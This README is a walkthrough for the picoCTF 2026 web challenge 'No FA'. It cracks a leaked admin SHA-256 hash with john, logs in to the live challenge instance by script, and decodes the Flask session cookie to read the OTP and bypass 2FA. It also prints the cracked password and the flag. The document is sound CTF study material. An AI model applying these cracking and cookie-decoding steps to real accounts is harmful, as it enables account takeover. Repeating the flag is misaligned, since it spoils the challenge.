# No FA

## Overview

This directory contains the local materials and manual walkthrough for the `No FA` challenge from `picoCTF 2026`. The goal of this README is to make the folder immediately useful to someone reviewing the archive later: what the challenge was about, what files matter, how the solve works at a high level, and which commands to run first.

## Challenge Profile

- Challenge: `No FA`
- Category: `Web Exploitation`
- Collection: `picoCTF`
- Event or Platform: `picoCTF 2026`
- Difficulty: `Medium`
- Author: `DARKRAICG492`

## Directory Contents

- `app.py`
- `no_fa_poc.sh`
- `users.db`

## First Commands To Run

Start with the original challenge materials in this folder. The goal is to identify the bug or recovery path from the provided files, then follow the numbered walkthrough below to reach the flag manually.

```bash
cd "/home/eliah/Desktop/CTF/picoCTF/No_FA"
ls -lah
```

Useful first inspection commands:

```bash
sed -n '1,220p' 'app.py'
sqlite3 'users.db' '.tables'
sqlite3 -header -column 'users.db' 'select username,password,two_fa from users;'
```

## Walkthrough

Challenge Name: No FA
Category: Web Exploitation
Difficulty: Medium
Event: picoCTF 2026
Author: DARKRAICG492

### Description

Seems like some data has been leaked! Can you get the flag?

Given information:
Files: app.py, users.db
Live instance used during solving: http://foggy-cliff.picoctf.net:52703

Solving idea:
1. Inspect app.py to understand the login and 2FA flow.
2. Use the leaked users.db database to recover the admin password hash.
3. Crack the admin SHA-256 hash from the leaked database.
4. Log in as admin and observe that Flask stores the OTP inside the client-side session cookie.
5. Decode the cookie, extract otp_secret, submit it, and read the flag.

### Step 1: Inspect the login logic.

Manual command:
sed -n '1,260p' app.py
Reason:
The app only shows the flag when session['username'] == 'admin' and
session['logged'] == 'true'. For admin, /login sets:
session['otp_secret']
session['otp_timestamp']
session['username'] = 'admin'
session['logged'] = 'false'

### Step 2: Dump the leaked user database.

Manual command:
sqlite3 -header -column users.db 'select username,password,two_fa from users;'
Reason:
This reveals the admin account hash:
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67

### Step 3: Crack the admin hash.

Manual command:
sqlite3 users.db "select password from users;" > hashes.txt
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=Raw-SHA256 hashes.txt
Reason:
The leaked hash cracks to:
admin : apple@123

### Step 4: Log in as admin and inspect the Flask session cookie.

Manual command:
python3 - <<'PY'
import requests
s = requests.Session()
s.get('http://foggy-cliff.picoctf.net:52703/login')
s.post('http://foggy-cliff.picoctf.net:52703/login',
data={'username': 'admin', 'password': 'apple@123'})
print(s.cookies.get('session'))
PY
Reason:
Flask's default session is signed but not encrypted, so the OTP is visible
to the client after login.

### Step 5: Decode the cookie and extract otp_secret.

Manual command:
python3 - <<'PY'
import base64, json, zlib
cookie = '.eJw...'
payload = cookie.split('.')[1]
raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
print(json.loads(zlib.decompress(raw).decode()))
PY
Reason:
The decoded session shows fields like:
{"logged":"false","otp_secret":"2124","otp_timestamp":..., "username":"admin"}

### Step 6: Submit the OTP to /two_fa.

Manual command:
Use the same requests session and POST the extracted otp_secret to /two_fa.
Reason:
Because the OTP is exposed in the client-side cookie, the second factor is
not actually secret.

### Flag obtained

picoCTF{n0_r4t3_n0_4uth_2b765193}

## Manual Reproduction Flow

Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.

```bash
cd "/home/eliah/Desktop/CTF/picoCTF/No_FA"
ls -lah
```

## Study Notes

This folder is best used as a practical study reference for `Web Exploitation`-style problems. Work through the manual HTTP requests and source inspection first, then compare your reasoning against the archived solve notes if needed.
